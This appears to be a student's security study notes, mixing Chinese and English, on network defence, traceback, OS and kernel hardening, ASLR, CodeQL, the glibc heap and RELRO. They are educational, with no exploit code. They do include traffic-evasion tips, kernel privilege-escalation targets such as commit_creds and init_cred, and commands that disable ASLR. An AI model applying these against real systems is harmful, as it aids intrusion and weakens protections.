<tr><td style="text-align: left">Configuration mode</td><td style="text-align: left">Layer 3 mode or transparent mode</td><td style="text-align: left">Inline mode , generally being in layer 2</td><td style="text-align: left">Inline or as end host (via span) for monitoring and detection</td></tr>
<tr><td style="text-align: left">Placement</td><td style="text-align: left">Inline at the Perimeter of Network</td><td style="text-align: left">Inline generally after Firewall</td><td style="text-align: left">Non-Inline through port span (or via tap)</td></tr>
<tr><td style="text-align: left">Traffic patterns</td><td style="text-align: left">Not analyzed</td><td style="text-align: left">Analyzed</td><td style="text-align: left">Analyzed</td></tr>
<tr><td style="text-align: left">Placement wrt each other</td><td style="text-align: left">Should be 1st Line of defense</td><td style="text-align: left">Should be placed after the Firewall device in network</td><td style="text-align: left">Should be placed after firewall</td></tr>
<tr><td style="text-align: left">Action on unauthorized traffic detection</td><td style="text-align: left">Block the traffic</td><td style="text-align: left">Preventing the traffic on Detection of anomaly</td><td style="text-align: left">Alerts/alarms on detection of anomaly</td></tr>
</tbody></table>
</div>
<p>为了避开流量分析，有下面一些办法</p>
<ul>
<li>Encrypt traffic to hide payloads</li>
<li>Use proxy to hide entire packets</li>
<li>Introduce noise traffic to hide patterns</li>
</ul>
<h2 id="traceback-analysis"><a class="header" href="#traceback-analysis">Traceback Analysis</a></h2>
<p><img src="Basic/Secure/../images/image-20220402161720171.png" alt="image-20220402161720171" /></p>
<p>最简单的方法就是看IP package的source IP，但是有IP spoofing的存在，并不准确。</p>
<p>[入口检测Ingress Filter]是一个简单有效的防止IP spoofing的方法，ISP only forwards packets with legitimate source IP.</p>
<p>中间的路由器有概率的记录下自己的IP Address，以便接受者知道包发送的路径。Edge Sampling：<strong>start</strong>  and  <strong>end</strong>  IP addresses <strong>distance</strong>: no. of hops since edge stored</p>
<p>ICMP Traceback: When forwarding packets, routers can, with a low probability, generate a Traceback message that is sent along to the destination. With enough Traceback messages from enough routers along the path, the traffic source and path can be determined.</p>
<p>Path validation:</p>
<p>Proof of Consent(许可)</p>
<p>Proof of Provenance(起源)</p>
<p>Link Testing 从最近的Router，请求他帮你回溯到上一个Router，如此递归直到发现attack source。</p>
<ul>
<li>Input Debugging: find attack signature分享给上一个路由，然后关掉端口1-attack还在? - 关掉端口2 - attak还在? ...</li>
<li>Controlled Flooding</li>
</ul>
<p>post-attack traceback: 让中间的寄存器做日志记录数据包的转发。记日志是很大的开销，所以可以采用一些方法比如Bloom Filter </p>
<p><img src="Basic/Secure/../images/image-20220402173144351.png" alt="image-20220402173144351" /></p>
<h2 id="network-protection"><a class="header" href="#network-protection">Network Protection</a></h2>
<p>Honeywords： 比如，创建假的账号密码，如果发现了有人试图用这个假的账号密码，就说明有入侵者，报警。</p>
<p>Hash+Salt: 防止同样的密码在数据库中以同样的值存储，防止知道一个人是否在不同的网站使用了同一个密码，防止offline dictionary attacks(An offline dictionary attack is performed by obtaining a ciphertext generated using the password-derived key, and trying each password against the ciphertext) https://www.tomczhen.com/2016/10/10/hashing-security/</p>
<p>负载均衡</p>
<p><img src="Basic/Secure/../images/image-20220411165625333.png" alt="image-20220411165625333" /></p>
<p>Access Control，有三个关键Subject，Object和Access Right。一个典型的例子就是Linux的权限管理机制。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="操作系统安全"><a class="header" href="#操作系统安全">操作系统安全</a></h1>
<p>美国国防部的一系列安全书籍：https://en.wikipedia.org/wiki/Rainbow_Series</p>
<h2 id="重要的基础概念"><a class="header" href="#重要的基础概念">重要的基础概念</a></h2>
<p>在橘皮书TCSEC中，将计算机系统的<strong>安全等级</strong>分成了 4 类 7 个等级，依次为 D 、C 、B 、A 四个等级。</p>
<div class="table-wrapper"><table><thead><tr><th>级别</th><th>系统的安全可信性</th></tr></thead><tbody>
<tr><td>D</td><td>没有安全防护</td></tr>
<tr><td>C1</td><td>自主存取控制</td></tr>
<tr><td>C2</td><td>DAC，审计。（Windows, Linux）</td></tr>
<tr><td>B1</td><td>MAC</td></tr>
<tr><td>B2</td><td>良好的结构化设计，形式化安全模型</td></tr>
<tr><td>B3</td><td>全面的访问控制，可信恢复</td></tr>
<tr><td>A1</td><td>形式化认证</td></tr>
</tbody></table>
</div>
<p><strong>TCB</strong>(Trust Computing Base): 信任的基础。比如你在操作系统层面做安全措施，就必须假设硬件是可信的；在用户层面做安全措施，就必须假设操作系统和硬件是可信的。一般来说，有如下的信任链，顶层必须信任底层，底层的漏洞会给顶层带来降维打击。</p>
<p><img src="Basic/Secure/../images/image-20220605211614517-16550345741186.png" alt="image-20220605211614517" /></p>
<p>操作系统层次以下的攻击</p>
<ol>
<li>硬件层面：侧信道攻击</li>
<li>架构攻击：比如Meltdown，Spectre</li>
<li>BIOS：刷机</li>
</ol>
<p><strong>Threat model</strong>: 还需要对攻击者的能力进行分析，对于操作系统的攻击者，一般分为</p>
<ol>
<li>Lab Attack: 有无限的能力进行攻击。</li>
<li>Shack Attack: 攻击者可以拿到设备，用一般的能力进行攻击。</li>
<li>Hack Attack: 攻击者只能远程的通过恶意软件，病毒。</li>
</ol>
<h2 id="secure-boot"><a class="header" href="#secure-boot">Secure boot</a></h2>
<p>boot的时候对内核进行完整性验证。</p>
<p><img src="Basic/Secure/../images/image-20220605214527928-165503459295111.png" alt="image-20220605214527928" /></p>
<h2 id="内核攻击方式"><a class="header" href="#内核攻击方式">内核攻击方式</a></h2>
<p><img src="Basic/Secure/../images/image-20220605215016065-165503460613116.png" alt="image-20220605215016065" /></p>
<p>攻击的复杂性指数级增加，控制能力在缩小；防护从软件方式到软硬结合，但是滞后于攻击。</p>
<p>另外，如果要防护后面的攻击方式，就必须先防住前面的攻击方式。比如要防护代码重用，就必须先防住代码注入，否则毫无意义——攻击者直接注入比重用更简单。</p>
<h3 id="代码注入攻击"><a class="header" href="#代码注入攻击">代码注入攻击</a></h3>
<p>通过<strong>页表</strong>的不可执行位进行防护。可写必然不可执行，可执行必然不可写。硬件支持比如ARM的PXN。</p>
<p>那么如果攻击者可以轻易修改页表，不就绕过了防护吗？我们可以通过<strong>隔离环境</strong>保护内核页表。硬件支持比如Intel VT, SGX; ARM TrustZone。</p>
<h3 id="代码重用攻击"><a class="header" href="#代码重用攻击">代码重用攻击</a></h3>
<p>比如攻击者通过ROP/JOP的方式。ROP是通过修改函数的返回地址，JOP是通过修改函数指针。</p>
<p>有一些防护方式：</p>
<ol>
<li>防止ROP
<ol>
<li>Stack Canary 保护返回地址，但是很容易绕过</li>
<li>Randomization 地址随机化，但是泄露了一个地址整个随机化就没用了</li>
<li>Shadow stack 再搞个栈存保存地址，防止篡改</li>
</ol>
</li>
<li>防止JOP
<ol>
<li>跳转检查LLVM CFI</li>
<li>指针保护CPI</li>
</ol>
</li>
<li>硬件支持
<ol>
<li>ARM PA 2016</li>
<li>Intel CET 2016</li>
</ol>
</li>
</ol>
<p>介绍一下LLVM type-based CFI，基本思路是对于每个间接调用，编译器通过匹配其函数指针和函数的类型，提前计算出潜在的目标函数集合，生成跳转表，限制间接调用的目标函数必须在集合中。开启内核的CFI保护编译，然后找了一个简单一点的函数，vfs_ioctl。</p>
<p><img src="Basic/Secure/../images/image-20220508183026746-165503462487521.png" alt="image-20220508183026746" /></p>
<p>大体逻辑是，对函数指针进行CFI检查。检查不合法，会用<code>__cfi_slowpath_diag</code>进行错误的处理。</p>
<p>关键部分的汇编代码的特征如下。ADRP的意思是加载PC相对地址。根据PC相对地址算出来一个地址，这个地址是什么？是某个插桩函数地址。然后和fp进行做差比较。也就是说如果差距在一定范围内（即在可以接受的跳转目标的集合内）则检查通过。注意，这里的<strong>fp也是插桩地址</strong>，不要被迷惑了，也就是说你在源代码中的函数<code>xxx</code>全部都被换成<code>xxx.cfi_jt</code>了。</p>
<p><img src="Basic/Secure/../images/image-20220508210551800-165503464045726.png" alt="image-20220508210551800" /></p>
<p>几个桩子实例，所有的参数类型相同的函数都被放在一起了，作为一个集合方便检查。</p>
<p><img src="Basic/Secure/../images/image-20220508211755110-165503465395831.png" alt="image-20220508211755110" /></p>
<h3 id="内核数据攻击"><a class="header" href="#内核数据攻击">内核数据攻击</a></h3>
<p>比如，对检查<code>if (checked) {...}</code>，如果能直接修改<code>checked</code>，也能实现攻击。</p>
<p>目前还缺乏有效的保护。</p>
<h2 id="保护的原则"><a class="header" href="#保护的原则">保护的原则</a></h2>
<p>当我们设计一个安全的系统的时候，需要注意什么？这是在1975年被提出的，但是到现在仍然非常有价值。</p>
<div class="table-wrapper"><table><thead><tr><th>Principles</th><th>Description</th></tr></thead><tbody>
<tr><td>Economy of mechanism</td><td>保护机制应该是简单而直观的</td></tr>
<tr><td>Fail-safe default</td><td>基于白名单而不是黑名单的访问控制</td></tr>
<tr><td>Complete mediation</td><td>所有的访问都应该被检查</td></tr>
<tr><td>Open design</td><td>安全不应该建立在对实现的保密上</td></tr>
<tr><td>Separation of privilege</td><td>权限分离</td></tr>
<tr><td>Least privilege</td><td>执行一个功能时，只给需要执行该功能的最小权限</td></tr>
<tr><td>Least common mechanism</td><td>最小化用户或程序彼此间的共享数据或共用机制</td></tr>
<tr><td>Psychological acceptability</td><td>用户可以自然而正确的使用保护机制</td></tr>
</tbody></table>
</div>
<p>除此之外，在设计安全系统的时候还应该考虑</p>
<ol>
<li>Auditing 安全审计</li>
<li>Trusted Oath</li>
</ol>
<h2 id="有关系统的漏洞"><a class="header" href="#有关系统的漏洞">有关系统的漏洞</a></h2>
<p>这个只是学了一点皮毛，要真的学好，要丰富的想象力，对内核深刻的认识，以及学习其他攻击者的利用代码。</p>
<p>能控制内存的漏洞，是最好的漏洞。</p>
<p><code>tty_struct</code> 里面有函数指针，还有一个用户可写的Buffer，还可以用里面的指针判断出<code>tty_struct</code>的地址。攻击者非常喜欢。</p>
<p>LSM hook的<code>task_prctl</code>，有5个参数，而且是原封不动的根据系统调用<code>prctl</code>从用户态传过来的，还有<code>ioctl</code>有3个参数。攻击者非常喜欢。</p>
<p><code>cred</code>是存储权限的数据结构，要获取Root权限和Capablity什么的，可以</p>
<ol>
<li>修改<code>task_struct</code>的<code>cred</code>的内容</li>
<li>一般也用<code>prepare_kernel_cred</code>+<code>commit_creds</code>来完成修改。</li>
<li><code>init_cred</code>是一个已经存在的Root权限的cred，也可以修改task_struct里的指针指向他</li>
</ol>
<p><code>addr_limit</code>是用户内存和系统内存的分界，可以调用<code>set_fs</code>修改他。修改了这个分界，可以把整个内核空间标记成用户空间。</p>
<h2 id="硬件保护机制"><a class="header" href="#硬件保护机制">硬件保护机制</a></h2>
<p>想要让保护机制高效，往往需要硬件的支持。Intel的硬件支持往往欠考虑，实现一些比较笨的硬件机制支持保护，所以以arm为例</p>
<div class="table-wrapper"><table><thead><tr><th>版本</th><th>Feature</th></tr></thead><tbody>
<tr><td>ARMv8.0</td><td>TrustZone</td></tr>
<tr><td>ARMv8.0</td><td>PXN 特权禁止执行</td></tr>
<tr><td>ARMv8.1</td><td>PAN 特权禁止访问</td></tr>
<tr><td>ARMv8.3</td><td>PA 指针认证</td></tr>
<tr><td>ARMv8.5</td><td>BTI 保护控制流完整性</td></tr>
<tr><td>ARMv8.5</td><td>MTE 内存标签</td></tr>
</tbody></table>
</div>
<p>PXN介绍：内核禁止执行用户空间的代码，由页表实现。</p>
<p>PAN介绍：内核禁止访问用户空间的数据，</p>
<p>BTI介绍：https://zhuanlan.zhihu.com/p/370947458。但是，这个东西感觉粒度太粗了，还不如LLVM支持的Type Based CFI。</p>
<p>MTE介绍：给内存和指针分别着色，只有匹配的颜色才能让指针访问内存。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="软件安全"><a class="header" href="#软件安全">软件安全</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="aslr"><a class="header" href="#aslr">ASLR</a></h1>
<p>ASLR(Address Space Layout Randomization)是地址随机化。比如下面的例子，每次运行libc的地址都不同。</p>
<pre><code class="language-shell">reticence:~/Desktop/SoftwareSec/lab1$ ldd bof-again 
	linux-gate.so.1 (0xf7f07000)
	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7cef000)
	/lib/ld-linux.so.2 (0xf7f09000)
reticence:~/Desktop/SoftwareSec/lab1$ ldd bof-again 
	linux-gate.so.1 (0xf7f9d000)
	libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d85000)
	/lib/ld-linux.so.2 (0xf7f9f000)
</code></pre>
<p>You can configure ASLR in Linux using the <code>/proc/sys/kernel/randomize_va_space</code> interface.</p>
<blockquote>
<p>The following values are supported:</p>
<ul>
<li>0 – No randomization. Everything is static.</li>
<li>1 – Conservative randomization. Shared libraries, stack, <code>mmap()</code>, VDSO and heap are randomized.</li>
<li>2 – Full randomization. In addition to elements listed in the previous point, memory managed through <code>brk()</code> is also randomized.</li>
</ul>
</blockquote>
<p>So, to disable it, run</p>
<pre><code class="language-sh">echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre>
<p>and to enable it again, run</p>
<pre><code class="language-sh">echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
</code></pre>
<h2 id="gdb和aslr"><a class="header" href="#gdb和aslr">gdb和ASLR</a></h2>
<p>gdb命令</p>
<pre><code>set disable-randomization on
set disable-randomization off
show disable-randomization
</code></pre>
<p>Modes</p>
<ul>
<li>on: In this mode GDB will disable the address space randomization for the debugged process. The addresses of stack variables will not change across different debugging sessions. This is the <strong>default</strong> mode.</li>
<li>off: In this mode GDB will not try to disable the address space randomization. If the randomization is enabled by the current Linux kernel, the stack pointers for the variables will have different values in different debugging sessions.</li>
</ul>
<p>所以，gdb禁止随机化就是把aslr禁止了。但是，上面的命令是需要root权限的，怎么做到单独的为一个进程关闭aslr呢？参考<a href="https://notes.tweakblogs.net/blog/15291/temporarily-disabling-address-space-layout-randomization-on-linux">https://notes.tweakblogs.net/blog/15291/temporarily-disabling-address-space-layout-randomization-on-linux</a></p>
<p><code>setarch -R</code>命令可以关闭地址随机化。比如通过执行下面的命令，就可以通过禁止ASLR执行some-program。</p>
<pre><code class="language-sh">setarch $(uname -m) -R ./some-program
</code></pre>
<p>他在底层使用了<a href="https://man7.org/linux/man-pages/man2/personality.2.html"><code>personality</code></a>系统调用。<code>ADDR_NO_RANDOMIZE </code>这个flag可以禁止地址随机化。猜测gdb大致是<code>fork() -&gt; personality() -&gt; exec()</code>这样的流程。</p>
<pre><code>strace -f sh -c 'command1 | command2'
</code></pre>
<h2 id="kaslr"><a class="header" href="#kaslr">KASLR</a></h2>
<p>KASLR就是Kernel Address Space Layout Randomization啦。类似的，KASLR让<strong>每次系统加载时</strong>代码的基地址都不一样。当然对齐还是会满足的，代码之间的相对位置也不会变，确切的说有下面几块内容的基地址发生了偏移。</p>
<p><img src="Basic/Secure/Software/../images/image-20220425214243713.png" alt="image-20220425214243713" /></p>
<p>.text段是2MB对齐的，所以说地址的低21bits是不会改变的。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="codeql"><a class="header" href="#codeql">CodeQL</a></h1>
<p>CodeQL is a <strong>static analysis</strong> engine used by developers to automate security checks, and by security researchers to perform <strong>variant analysis</strong>.</p>
<p>CodeQL会分析源程序，分析的结果会保存成数据库。然后我们可以对数据库进行查询，即对源程序进行分析。</p>
<p>所以我们怎么构建数据库呢？</p>
<pre><code class="language-shell">codeql database create &lt;输出数据库路径&gt; \
       --source-root=&lt;目标源代码所在路径&gt; \
       --language=&lt;目标源代码语言&gt; \
       --command=&quot;&lt;编译命令&gt;&quot;
</code></pre>
<p>然后，你就可以在<code>&lt;输出数据库路径&gt;</code>看到你的数据库了。</p>
<p>然后怎么对数据库进行查询呢？我们知道一般用来查询数据库的语言是SQL，在这里就是CodeQL。他的格式和SQL很像。我们可以去使用<a href="https://github.com/github/vscode-codeql-starter">vscode-codeql-starter</a>来下载很多的查询示例。一个简单的示例如下：</p>
<pre><code class="language-sql">import cpp
from BlockStmt b
where b.getNumStmt() = 0
select b, &quot;This is an empty block.&quot;
</code></pre>
<p><code>import&lt;语言&gt;</code>，然后<code>from-where-select</code>，这就是大部分查询的结构了。</p>
<p>不过除了这些基本操作，还可以定义CodeQL <a href="https://codeql.github.com/docs/ql-language-reference/types/#defining-a-class">classes</a>和<a href="https://codeql.github.com/docs/ql-language-reference/predicates/#defining-a-predicate">predicates</a>。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="glibc-heap-allocator"><a class="header" href="#glibc-heap-allocator">glibc heap allocator</a></h1>
<p>有各种各样的堆管理器的实现。不同的实现我们的利用方式也会有细微的差别。以<code>gblic</code>为例，我们对堆的设计进行探索。</p>
<p>首先明确一点，当我们使用<code>malloc(size)</code>请求一块内存的时候，并不是随便找一个<code>size</code>大小的内存然后返回。首先<code>size</code>是需要对齐的，然后还需要分配额外的空间存储metadata。实际分配到的内存块称为<strong>Chunk</strong>，大小略大于<code>size</code>。如下图所示。</p>
<p><img src="Basic/Secure/Software/../images/chunk-allocated-simple-CS.png" alt="img" /></p>
<h2 id="malloc"><a class="header" href="#malloc">Malloc</a></h2>
<p>所以Chunk是如何被分配的呢？一个简化的模型：</p>
<blockquote>
<p>The simplified chunk-allocation strategy for small chunks is this:</p>
<ol>
<li>If there is a previously-freed chunk of memory, and that chunk is big enough to service the request, the heap manager will use that freed chunk for the new allocation.</li>
<li>Otherwise, if there is available space at the top of the heap, the heap manager will allocate a new chunk out of that available space and use that.</li>
<li>Otherwise, the heap manager will ask the kernel to add new memory to the end of the heap, and then allocates a new chunk from this newly allocated space.</li>
<li>If all these strategies fail, the allocation can’t be serviced, and <em>malloc</em> returns NULL.</li>
</ol>
</blockquote>
<p>所以我们认为我们的malloc时，可用内存有好几种：一种是回收的内存，一种是堆顶内存，一种是其他内存。</p>
<p>申请新Chunk的时候，遍历链表看有没有足够大的链表可供分配。那么没有找到可用的回收Chunk，可以在堆顶分配出内存创建新的Chunk，再不够就向操作系统申请内存来扩大堆，就是我们熟悉的<a href="https://linux.die.net/man/2/brk"><code>brk</code></a>系统调用。<code>brk</code>调用失败后再求助<code>mmap</code>，Once the heap reaches this point, the heap manager will resort to attaching new non-contiguous memory to the initial program heap using calls to mmap。（这里我不是很懂，mmap可以申请一块匿名的内存区域，但是当heap已经触碰到了比如其他library的区域的时候，怎么办呢？）</p>
<h2 id="chunk"><a class="header" href="#chunk">Chunk</a></h2>
<p>再来看Chunk的结构，以glibc为例，每个Chunk可以视作下面的数据结构。</p>
<p><img src="Basic/Secure/Software/../images/chunk-allocated-CS.png" alt="img" /></p>
<p>可以看到，除了User Data，前面还存放了Chunk Size和一些Flag：</p>
<ul>
<li>
<p>Chunk Size，在64位机器中是16bytes对齐的(在32位机器中是8bytes对齐的)，所以最低的4(3)位是0，我们可以用它来存放Flag。</p>
</li>
<li>
<p>A(0x04)：告诉我们这个Chunk是否属于Secondary Arena。</p>
<p>当程序是单线程的时候，只有Main Arena。但是多线程的时候为了避免全局的锁提高效率，会分配其他线程一个Secondary Arena，Secondary Arena不在程序的堆区，而是使用mmap分配内存。他模拟堆的增长也很有意思，先用mmap分配一块内存(subheap)标记为<code>PROT_NONE</code>，然后需要用的时候用mprotect标记成<code>PROT_READ|PROT_WRITE</code>，直到subheap用完了再用mmap请求新的subheap。</p>
</li>
<li>
<p>M(0x02)：告诉我们Chunk是通过<code>mmap</code>分配的，不在Heap区中。这意味着free的时候，直接通过<code>munmap</code>进行free，将整块内存还给操作系统。</p>
<p>当请求分配的内存过大的时候，堆管理器会直接使用<code>mmap</code>请求一块内存区域，然后free的时候直接通过<code>munmap</code>释放。</p>
</li>
<li>
<p>P(0x01)：告诉我们前一个Chunk是否是Free的，因为如果前一个Chunk是free的话，就可以在free的时候直接将这一个Chunk和前一个Chunk合并</p>
</li>
</ul>
<h2 id="free"><a class="header" href="#free">Free</a></h2>
<p>我们知道<code>free</code>是用来释放我们用<code>malloc</code>申请来的内存的。根据标准的规定，<code>free(NULL)</code>应该什么都不做。否则应该释放指针指向的对应的Chunk。</p>
<p>显然，指针本身不包含内存的大小信息，大小信息是存储在指针指向的内存之前的metadata的。free操作必然离不开metadata。所以只有正确的metadata（即从malloc申请而来，而且没有被free过）才能让free正常的工作，不然就会出现undefined behaviour。轻则程序崩溃，重则漏洞利用。</p>
<p>Free chunks也存储metadata，布局和分配的Chunk是一样的，Chunk Size+A+P，不过是不可能有M的。因为之前也介绍过了，M表示是从mmap直接申请来的，释放直接通过munmap还给操作系统。除此以外，在数据的最后还存着Previous Size，这有什么用呢？这意味着我们有一个free的指针，我们不仅可以根据Chunk Size计算出下一个Chunk地址，还可以根据Previous Size计算出上一个Chunk地址。</p>
<p><img src="Basic/Secure/Software/../images/chunk-freed-CS.png" alt="img" /></p>
<p>看一些Free的基本策略</p>
<blockquote>
<ol>
<li>If the chunk has the <em>M</em> bit set in the metadata, the allocation was allocated off-heap and should be munmaped.</li>
<li>Otherwise, if the chunk <em>before</em> this one is free, the chunk is merged backwards to create a bigger free chunk.</li>
<li>Similarly, if the chunk <em>after</em> this one is free, the chunk is merged forwards to create a bigger free chunk.</li>
<li>If this potentially-larger chunk borders the “top” of the heap, the whole chunk is absorbed into the end of the heap, rather than stored in a “bin”.</li>
<li>Otherwise, the chunk is marked as free and placed in an appropriate <strong>bin</strong>.</li>
</ol>
</blockquote>
<p>用<code>mmap</code>分配的Chunk用<code>munmap</code>回收，否则Chunk一定来自于堆区。如果和Chunk相邻的Chunk正好也是Free的，那么可以合并这两个Chunk再回收。回收的时候，如果说正好在堆的顶部，那么就直接还给堆区，否则要回收到对应的“垃圾桶”(<strong>bin</strong>)。</p>
<h2 id="bin"><a class="header" href="#bin">Bin</a></h2>
<p>bin在这里可以做回收站理解。回收的东西是Chunk。glibc中的bin一共有5种：</p>
<ol>
<li>62 small bins</li>
<li>63 large bins</li>
<li>1 unsorted bin</li>
<li>10 fast bins</li>
<li>64 tcache bins</li>
</ol>
<p>他们反应了堆设计的思想：</p>
<ul>
<li>
<p>small bins是Chunk Size从16 bytes到504 bytes的，正好每8个bytes一个bin。bin的Size的意思是说bin可以装什么Size的Chunk。</p>
</li>
<li>
<p>large bins不再是一个bin对应一个Chunk，而是一个bin对应一个范围内的Chunk，也是为此large bin在插入的时候需要排序，比较慢。</p>
<p><img src="Basic/Secure/Software/../images/bins-large.png" alt="img" /></p>
</li>
<li>
<p>Unsorted bins里面的Chunk没有固定的大小。他的设计是基于这样一个理念：如果我刚回收了Size=X的Chunk，很可能我不久之后就要用Size=X的Chunk。所以我可以先把free的Chunk放进Unsorted bin，而不去做是否可以合并Chunk的检查。不过因为里面的Chunk没有固定大小，所以查找的话需要整个遍历。</p>
</li>
<li>
<p>fast bins基于这样一个观察，就是Size比较小的使用的非常频繁。所以我们有Size为16,24一直到88 bytes的fast bin。他和small bins的区别在于fast bin并不尝试进行merge。他和small bins有size重叠的部分，显然，fast bins是优先的。</p>
</li>
<li>
<p>tcache bins是为多线程服务的，不看了。</p>
</li>
</ul>
<h2 id="altogether"><a class="header" href="#altogether">Altogether</a></h2>
<blockquote>
<p>We now know enough to fully understand the entire behavior of <em>malloc</em> and <em>free</em> in the <em>glibc</em> heap implementation, and why each part of the algorithm exists. Let’s recap.</p>
<p>First, every allocation exists as a memory chunk which is aligned and contains metadata as well as the region the programmer wants. When a programmer requests memory from the heap, the heap manager first works out what chunk size the allocation request corresponds to, and then searches for the memory in the following order:</p>
<ol>
<li>
<p>If the size corresponds with a <em>tcache</em> bin and there is a <em>tcache</em> chunk available, return that immediately.</p>
</li>
<li>
<p>If the request is enormous allocate a chunk off-heap via <em>mmap.</em></p>
</li>
<li>
<p>Otherwise we obtain the arena heap lock and then perform the following strategies, in order:</p>
<ol>
<li>
<p>Try the <em>fastbin/smallbin</em> recycling strategy</p>
<ul>
<li>If a corresponding <em>fast bin</em> exists, try and find a chunk from there (and also opportunistically prefill the <em>tcache</em> with entries from the fast bin).</li>
<li>Otherwise, if a corresponding <em>small bin</em> exists, allocate from there (opportunistically prefilling the <em>tcache</em> as we go).</li>
</ul>
</li>
<li>
<p>Resolve all the deferred frees</p>
<ul>
<li>Otherwise “truly free” the entries in the fast-bins and move their consolidated chunks to the <em>unsorted</em> bin.</li>
<li>Go through each entry in the <em>unsorted</em> bin. If it is suitable, stop. Otherwise, put the unsorted entry on its corresponding small/large bin as we go (possibly promoting small entries to the <em>tcache</em> as we go).</li>
</ul>
</li>
<li>
<p>Default back to the basic recycling strategy</p>
<ul>
<li>If the chunk size corresponds with a large bin, search the corresponding large bin now.</li>
</ul>
</li>
<li>
<p>Create a new chunk from scratch</p>
<ul>
<li>
<p>Otherwise, there are no chunks available, so try and get a chunk from the top of the heap.</p>
</li>
<li>
<p>If the top of the heap is not big enough, extend it using <em>sbrk</em>.</p>
</li>
<li>
<p>If the top of the heap can’t be extended because we ran into something else in the address space, create a discontinuous extension using <em>mmap</em> and allocate from there</p>
</li>
</ul>
</li>
<li>
<p><strong>If all else fails, return NULL.</strong></p>
</li>
</ol>
</li>
</ol>
<p>And the corresponding <em>free</em> strategy:</p>
<ol>
<li>If the pointer is NULL, the C standard defines the behavior as “do nothing”.</li>
<li>Otherwise, convert the pointer back to a chunk by subtracting the size of the chunk metadata.</li>
<li>Perform a few sanity checks on the chunk, and abort if the sanity checks fail.</li>
<li>If the chunk fits into a <em>tcache</em> bin, store it there.</li>
<li>If the chunk has the <em>M</em> bit set, give it back to the operating system via <em>munmap</em>.</li>
<li>Otherwise we obtain the arena heap lock and then:
<ol>
<li>If the chunk fits into a fastbin, put it on the corresponding fastbin, and we’re done.</li>
<li>If the chunk is &gt; 64KB, consolidate the fastbins immediately and put the resulting merged chunks on the unsorted bin.</li>
<li>Merge the chunk backwards and forwards with neighboring freed chunks in the small, large, and unsorted bins.</li>
<li>If the resulting chunk lies at the top of the heap, merge it into the top of the heap rather than storing it in a bin.</li>
<li>Otherwise store it in the <em>unsorted bin</em>. (<em>Malloc</em> will later do the work to put entries from the unsorted bin into the small or large bins).</li>
</ol>
</li>
</ol>
</blockquote>
<p>堆使用的一些原则：</p>
<ul>
<li>Do not read or write to a pointer retuened by <code>malloc</code> after that pointer has been passed back to free, or it can lead <strong>use after free</strong> vylnerabilities.</li>
<li>Do not use or leak uninitialized inforamtion in a heap allocation, or it can lead to <strong>information leaks</strong> or <strong>uninitialized data</strong> vulnerabilities.</li>
<li>Do not read or write bytes after the end of an allocation, or it can lead to <strong>heap overflow</strong> and <strong>read beyond bounds</strong> vulnerabilities.</li>
<li>Do not pass a pointer that originated from malloc to free more than once, or it can lead to <strong>double free</strong> vulnerabilities.</li>
<li>Do not pass a pointer that did not originate from malloc to free, or it can lead to <strong>invalid free</strong> vulnerabilities.</li>
<li>Do not use a pointer returned by malloc before checking if the function returned NULL, or it can lead to null-dereference bugs and occasionally <strong>arbitrary write</strong> vulnerabilities.</li>
</ul>
<hr />
<p>图源及参考资料：</p>
<p>https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/</p>
<p>https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="位置无关代码和共享库"><a class="header" href="#位置无关代码和共享库">位置无关代码和共享库</a></h1>
<p><strong>位置无关代码(Position Independent Code, PIC)</strong>，是说运行的时候，代码可以加载到任意内存地址。</p>
<p>一般来说，<strong>共享库</strong>都需要编译成位置无关代码。在Linux上我们熟悉的.so文件就是共享库文件，Windows的DLL可以认为是类似的东西。</p>
<h2 id="如何编译一个共享库"><a class="header" href="#如何编译一个共享库">如何编译一个共享库</a></h2>
<pre><code class="language-sh">gcc -fPIC -shared -o rm.so hook.c -ldl
</code></pre>
<ul>
<li>-fPIC: 位置无关</li>
</ul>
<h2 id="如何使用共享库-动态链接"><a class="header" href="#如何使用共享库-动态链接">如何使用共享库-动态链接</a></h2>
<p>动态链接，即在运行时解析内嵌的库名。</p>
<p><strong>动态链接器本身也是一个共享库</strong>，其名称为<code>/lib/ld-linux.so.2</code>。这个文件一般是一个软链接，比如在我的电脑上<code>/lib/ld-linux.so.2 -&gt; i386-linux-gnu/ld-linux.so.2</code>。</p>
<p>动态链接器会检查程序所需的共享库清单并使用<strong>一组预先定义好的规则</strong>来在文件系统上找出相关的库文件。一般来说共享库位于<code>/lib</code>和<code>/usr/lib</code>中，在某些同时支持32位和64位的架构（比如x86-64），还有<code>*/lib64</code>和<code>*/usr/lib32</code>等目录也会存放共享库。</p>
<p>通知动态链接器一个共享库位于一个非标准目录中的一种方法是将该目录添加到<code>LD_LIBRARY_PATH</code>环境变量中以分号分隔的目录列表中。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="relro"><a class="header" href="#relro">RELRO</a></h1>
<p><strong>RELocation Read-Only (or RELRO)</strong> is a security measure which makes some binary sections read-only.</p>
<p>There are two RELRO &quot;modes&quot;: partial and full.</p>
<h2 id="full-relro"><a class="header" href="#full-relro">Full RELRO</a></h2>
<p>Full RELRO makes the <strong>entire GOT read-only</strong> which removes the ability to perform a &quot;GOT overwrite&quot; attack, where the GOT address of a function is overwritten with the location of another function or a ROP gadget an attacker wants to run.</p>
<p>Full RELRO is not a default compiler setting as it can greatly increase program startup time since <strong>all symbols must be resolved before the program is started(GOT表的lazy binding不能用了，因为GOT表不能写)</strong>. In large programs with thousands of symbols that need to be linked, this could cause a noticable delay in startup time.</p>
<p>观察一个Full RELRO的ELF，下面有两个<code>.got</code>段的映射（忽略<code>.plt.got</code>），03段是读写，08段是只读。不过我们再仔细观察，发现03段和08段被映射到了同一个地址，不过大小不同。03 segment的前四个section被映射成只读了。</p>
<p><img src="Basic/Secure/Software/../images/image-20220412110458571.png" alt="image-20220412110458571" /></p>
